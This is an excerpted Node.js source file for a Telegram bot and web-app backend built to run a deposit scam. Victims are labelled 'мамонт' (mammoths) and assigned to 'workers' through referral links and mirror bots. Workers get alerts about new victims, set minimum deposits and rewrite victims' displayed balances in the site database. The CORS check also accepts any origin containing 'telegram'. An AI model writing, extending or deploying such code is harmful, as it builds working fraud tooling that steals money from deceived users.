...
app.use(cors({
    origin: (origin, callback) => {
        // Разрешаем запросы без origin (например, из Telegram Mini App)
        ...
        // Проверяем без протокола
        const withoutProtocol = origin.replace(/https?:\/\//, '');
        if (allowedOrigins.some(allowed => allowed.replace(/https?:\/\//, '') === withoutProtocol)) {
            return callback(null, true);
        }

        // Разрешаем все поддомены telegram.org
        if (origin.endsWith('.telegram.org') || origin.includes('telegram')) {
            return callback(null, true);
        }
...
function configureSiteDb() {
    siteDb.exec(`
        PRAGMA journal_mode = WAL;
        PRAGMA synchronous = NORMAL;
        PRAGMA busy_timeout = 10000;
    `, (err) => { if (err) console.error('Site DB pragma:', err.message); });
}
configureSiteDb();

function siteGet(sql, params = []) {
    return new Promise((resolve, reject) => {
        siteDb.get(sql, params, (err, row) => {
            err ? reject(err) : resolve(row || null);
        });
    });
}
function siteAll(sql, params = []) {
    return new Promise((resolve, reject) => {
        siteDb.all(sql, params, (err, rows) => {
            err ? reject(err) : resolve(rows || []);
        });
    });
}
function siteRun(sql, params = []) {
    return new Promise((resolve, reject) => {
        siteDb.run(sql, params, function(err) {
            err ? reject(err) : resolve({ changes: this.changes || 0, lastID: this.lastID || 0 });
        });
    });
}
...
// Команда /link
sharedBot.command('link', async (ctx) => {
...
// Команда /help
sharedBot.command('help', async (ctx) => {
    ctx.reply(`📌 Доступные команды:
/bb — панель воркера
/link email — привязать существующий аккаунт
/mirror — создать зеркало бота
/fixmenu — исправить Menu Button URL
/start — запустить мини-апп`);
});

// Команда /checkmenu - проверяет текущий Menu Button
userBot.command('checkmenu', async (ctx) => {
    const tgId = ctx.from.id.toString();
    ...
    try {
        const menuButton = await userBot.telegram.getChatMenuButton();
        ctx.reply(`📋 Текущий Menu Button:\n${JSON.stringify(menuButton, null, 2)}\n\nДолжен быть: ${DOMAIN}`);
    } catch (e) {
        console.error('checkmenu error:', e);
        ctx.reply(`❌ Ошибка: ${e.message}`);
    }
});

// Команда /fixmenu - исправляет Menu Button URL
userBot.command('fixmenu', async (ctx) => {
    const tgId = ctx.from.id.toString();
    if (!ADMIN_IDS.includes(tgId)) {
        return ctx.reply('❌ Только для администраторов');
    }
    ...
    try {
        // Сначала проверяем текущий
        const current = await userBot.telegram.getChatMenuButton({ chat_id: ctx.chat.id });
        console.log('Current menu button:', current);

        // Пробуем разные варианты установки

        // Вариант 1: для конкретного чата
        await userBot.telegram.setChatMenuButton({
            chat_id: ctx.chat.id,
            menu_button: {
                type: 'web_app',
                text: 'Open App',
        ...
        // Вариант 2: для всех пользователей (default)
        await userBot.telegram.setChatMenuButton({
            menu_button: {
                type: 'web_app',
                text: 'Open App',
        ...
        const updated = await userBot.telegram.getChatMenuButton({ chat_id: ctx.chat.id });
        console.log('Updated menu button:', updated);

        ctx.reply(`✅ Menu Button установлен!\n\nБыло: ${JSON.stringify(current, null, 2)}\n\nСтало: ${JSON.stringify(updated, null, 2)}\n\nURL: ${DOMAIN}\n\n⚠️ Если тип всё ещё "commands", значит нужно настроить через BotFather или использовать inline кнопку в /start`);
    } catch (e) {
        console.error('fixmenu error:', e);
        ctx.reply(`❌ Ошибка: ${e.message}\n\nStack: ${e.stack}`);
    }
});

// Команда /start – исправлена: использует ensureTelegramUser без дублей
sharedBot.start(async (ctx) => {
    const args = ctx.payload || '';
    let url = DOMAIN;
    try {
        const mammoth = await ensureTelegramUser(ctx.from);
        const token = ctx.telegram?.token;
        const isMirror = !!(token && token !== USER_BOT_TOKEN);
        console.log(`[start] token === USER_BOT_TOKEN: ${token === USER_BOT_TOKEN}, isMirror: ${isMirror}, mammoth: ${mammoth.tgId}, email: ${mammoth.email}`);
        let worker = null;
        if (isMirror) {
            const mirror = await get("SELECT worker_tg_id FROM mirror_bots WHERE bot_token = ? AND is_active = 1", [token]);
            console.log(`[start] mirror query result: ${JSON.stringify(mirror)}, token: ${token?.substring(0,10)}...`);
            if (mirror) {
                worker = await get("SELECT tg_id FROM users WHERE tg_id = ? AND is_worker = 1", [mirror.worker_tg_id]);
                console.log(`[start] worker query result: ${JSON.stringify(worker)}`);
            }
        } else {
            worker = await resolveWorkerByRef(args);
        }
        console.log(`[start] worker?.tg_id: ${worker?.tg_id}, mammoth.tgId: ${mammoth.tgId}, eq: ${worker?.tg_id === mammoth.tgId}`);
        if (worker?.tg_id && worker.tg_id !== mammoth.tgId) {
            const attached = await attachUserToWorker(mammoth.email, worker.tg_id);
            console.log(`[start] attached: ${attached} (email: ${mammoth.email}, workerId: ${worker.tg_id})`);
            if (attached) {
                userBot.telegram.sendMessage(worker.tg_id, `🎯 Новый мамонт${isMirror ? ' через зеркало' : ''}: @${mammoth.tgUsername || mammoth.firstName || '?'} (ID: ${mammoth.tgId})`).catch(() => {});
                logToAdmin(`📩 Мамонт${isMirror ? ' через зеркало' : ''}: ${mammoth.email} (${mammoth.tgId}) -> воркер: ${worker.tg_id}`);
...
sharedBot.command('mirror', async (ctx) => {
    const uid = ctx.from.id;
    const tgId = uid.toString();
...
let mammothPages = {};
sharedBot.command('bb', async (ctx) => {
    const tgId = ctx.from.id.toString();
...
sharedBot.action(/mirror_(.+)/, async (ctx) => {
    const botUsername = ctx.match[1];
    const mirror = await get("SELECT bot_username, bot_token, created_at, is_active FROM mirror_bots WHERE bot_username = ?", [botUsername]);
...
sharedBot.action('create_mirror', (ctx) => {
    pendingMirrorToken[ctx.from.id] = true;
    ctx.reply('Введите токен вашего бота:');
    ctx.answerCbQuery();
});
sharedBot.action('toggle_logs', async (ctx) => {
...
sharedBot.action('manual_bind_mammoth', async (ctx) => {
    const tgId = ctx.from.id.toString();
...
sharedBot.action('my_mammoths_list', async (ctx) => {
    const tid = ctx.from.id.toString();
...
sharedBot.action('change_min_deposit', (ctx) => {
...
sharedBot.action('attach_account', async (ctx) => {
    const tgId = ctx.from.id.toString();
...
sharedBot.action('detach_account', async (ctx) => {
    const tgId = ctx.from.id.toString();
...
// ========== ЗЕРКАЛА БОТОВ ==========
async function launchMirrorBot(token, workerTgId) {
    const { data } = await axios.get(`https://api.telegram.org/bot${token}/getMe`, { timeout: 10000 });
    if (!data.ok || !data.result?.username) throw new Error('Invalid token');
    const username = data.result.username;

    if (mirrorBots[username]) {
        await mirrorBots[username].bot.stop('replace').catch(() => {});
        delete mirrorBots[username];
    }

    const bot = new Telegraf(token);
    bot.use((ctx, next) => {
        const text = ctx.message?.text || ctx.callbackQuery?.data || '(no text)';
        console.log(`[mirror:${username}] update type:${ctx.updateType} from:${ctx.from?.id} text:${text.substring(0,50)}`);
        return next();
    });
    bot.use(sharedBot);
    bot.catch((err, ctx) => { console.error(`Mirror bot @${username} error:`, err.message); });

    bot.botInfo = await bot.telegram.getMe();
    await bot.telegram.deleteWebhook({ drop_pending_updates: true });
    bot.startPolling().catch(e => console.error(`Mirror bot @${username} polling error:`, e.message));

    mirrorBots[username] = { bot, worker_tg_id: workerTgId, token };
    console.log(`✅ Mirror bot @${username} launched for worker ${workerTgId}`);
    return username;
}
...
sharedBot.on('text', async (ctx) => {
    ...
    if (pendingMirrorToken[uid]) {
        ...
        await run("INSERT INTO mirror_bots (worker_tg_id, bot_token, bot_username, created_at) VALUES (?,?,?,?)", [tid, token, username, Date.now()]);
        await ctx.reply(`✅ Бот @${username} успешно запущен`);
        // Запускаем зеркало асинхронно, чтобы не блокировать ответ
        setImmediate(() => {
            launchMirrorBot(token, tid).then(() => {
                console.log(`✅ Mirror bot @${username} running`);
            }).catch(e => {
                console.error(`Failed to launch mirror bot @${username}:`, e.message);
            });
        });
        return;
    }
    ...
    // Шаг 1: ввод username/email для изменения баланса (через БД сайта)
    ...
    if (awaitingBalanceAmount[uid]) {
        ...
        try {
            ...
            const user = await siteGet("SELECT id, balance_cents, username, email FROM users WHERE id = ?", [target.id]);
            if (!user) return ctx.reply('❌ Пользователь не найден в БД сайта.');
            ...
            await siteRun("UPDATE users SET balance_cents = ? WHERE id = ?", [nextCents, target.id]);
            logTransaction('balance_updated', { target: user.email || user.username, prev: current/100, new: nextCents/100, mode, db: 'site' });
            logToAdmin(`💰 Воркер ${tid} изменил баланс @${user.username || user.email}: $${(current/100).toFixed(2)} -> $${(nextCents/100).toFixed(2)}`);
            await ctx.reply(`✅ Баланс @${user.username || user.email} обновлён в БД сайта: $${(nextCents/100).toFixed(2)}`);
        } catch (e) {
    ...
    if (pendingMammothBindings[uid]) {
        ...
        const workerLink = ctx.from.username ? `@${ctx.from.username}` : `ID: ${tid}`;

        ctx.reply(`✅ Мамонт ${mammothLink} успешно привязан!`);
        logToAdmin(`🔗 Воркер ${workerLink} (${tid}) привязал мамонта ${mammothLink} (${targetMammoth.email})`);
...
adminBot.start(ctx => isAdmin(ctx) && ctx.reply('Панель администратора'));
...
userBot.use(sharedBot);

// Запуск ботов
(async () => {
    userBot.botInfo = await userBot.telegram.getMe();
    await userBot.telegram.deleteWebhook({ drop_pending_updates: true });
    userBot.startPolling().catch(e => console.error('User bot polling error:', e.message));
    console.log('✅ User bot launched');

    await new Promise(r => setTimeout(r, 1000));

    // Автоматически устанавливаем Menu Button при запуске
    try {
        await userBot.telegram.setChatMenuButton({
            menu_button: {
                type: 'web_app',
        ...
        console.log(`✅ Menu Button set to: ${DOMAIN}`);
    } catch (e) {
        console.error('❌ Failed to set Menu Button:', e.message);
    }
    // Запуск существующих зеркал
    try {
        const existing = await all("SELECT bot_token, worker_tg_id, bot_username FROM mirror_bots WHERE is_active = 1");
        for (const m of existing) {
            try {
                await launchMirrorBot(m.bot_token, m.worker_tg_id);
            } catch (e) {
                console.error(`❌ Failed to launch mirror bot @${m.bot_username}:`, e.message);
            }
        }
    } catch (e) {
        console.error('❌ Failed to load existing mirror bots:', e.message);
    }
})();
...
app.use(session({
    ...
    cookie: {
        ...
        sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax' // 'none' для работы в iframe Telegram
    },
    proxy: true
}));
...
// Middleware для логирования запросов (только для /api/)
...
app.post('/api/auth/register', asyncHandler(async (req, res) => {
    ...
    if (!username || username.length < 3) {
        ...
        return res.status(400).json({ success: false, msg: 'Username too short' });
    }
...
// Fallback для всех остальных путей (SPA)
app.use((req, res) => {
...
process.on('SIGINT', () => {
    ...
    for (const name of Object.keys(mirrorBots)) {
        mirrorBots[name].bot.stop('SIGINT').catch(() => {});
    }
    process.exit();
});
